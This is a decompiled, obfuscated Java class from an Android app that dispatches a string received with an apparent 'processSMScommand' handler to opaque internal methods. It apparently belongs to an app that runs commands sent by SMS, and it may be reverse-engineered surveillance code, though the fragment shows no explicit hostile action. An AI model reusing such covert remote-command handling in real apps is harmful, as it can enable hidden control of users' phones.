package com.network.android.a;

import android.content.Context;
import com.network.android.c.a.a;
import com.network.b.b;

final class d implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ String f45a;
    final /* synthetic */ Context b;
    final /* synthetic */ String c;

    d(String str, Context context, String str2) {
        this.f45a = str;
        this.b = context;
        this.c = str2;
    }

    public final void run() {
        try {
            b.m();
            b.s();
            b.a(this.f45a.getBytes(), this.b, true, this.c);
            b.a(this.b);
        } catch (Throwable th) {
            a.a("processSMScommand: " + th.getMessage(), th);
        }
    }
}
